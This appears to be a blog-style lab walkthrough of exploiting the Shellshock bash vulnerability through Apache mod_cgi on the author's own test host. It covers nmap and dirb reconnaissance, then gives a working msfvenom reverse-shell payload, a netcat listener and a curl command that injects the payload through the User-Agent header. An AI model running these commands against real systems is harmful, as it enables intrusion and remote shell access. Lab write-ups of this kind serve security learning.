# Exploiting Shellshock

Shellshock is a vulnerability found in bash that affected versions of bash up until version 4.3.
In 2014, Stephane Chazelas discovered bash would evaluate commands after a function definition inside of environment variables.

I've set up a host to demonstrate this vulnerability by way of Apache's Mod_CGI.

An initial scan of the host show's port 80 listening.

![nmap scan of a host showing port 80 listening](images/shellshock/nmap.png)

Of course, versioning of Apache might hint at the vulnerability, but the vulnerability is in bash, not Apache.
Using dirb on the host shows a directory, /cgi-bin, we might find interesting.

![dirb running against the host showing a 403 status code for /cgi-bin](images/shellshock/dirbroot.png)

Eventually, dirb looks at subdirectories, but runing it against /cgi-bin shows us a CGI script "hello".

![dirb running against the host in /cgi-bin, showing the hello script](images/shellshock/dirbcgi.png)

Visiting this URL shows the output of a hello world program and that it was generated with a version of bash that's vulnerable to shellshock.

![the output of running the hello cgi script, showing "Hello, world!" and that it was generated with bash 4.1.5](images/shellshock/cgihello.png)

The reason we're able to exploit bash CGI scripts in this manner is because Apache's Mod_CGI calls the script with environment variables we've passed in the form of our user agent.

First thing's first, we need to generate a reverse shell. Let's do so using msfvenom.

!["msfvenom -p cmd/unix/reverse_bash LHOST=192.168.122.1 LPORT=4444" with output of "0<&67-;exec 67<>/dev/tcp/192.168.122.1/4444;sh <&67 >&67 2>&67"](images/shellshock/msfvenom.png)

Now we can start our netcat listener with "nc -lnvp 4444" and craft our exploit using curl.

![curl -H "user-agent: () { :; }; 0<&67-;exec 67<>/dev/tcp/192.168.122.1/4    444;sh <&67 >&67 2>&67" http://192.168.122.130/cgi-bin/hello](images/shellshock/exploit.png)

After running that, we catch our reverse shell and do whatever it is we do.

![netcat listener showing a connection with us verifying it by running uname and id](images/shellshock/shell.png)
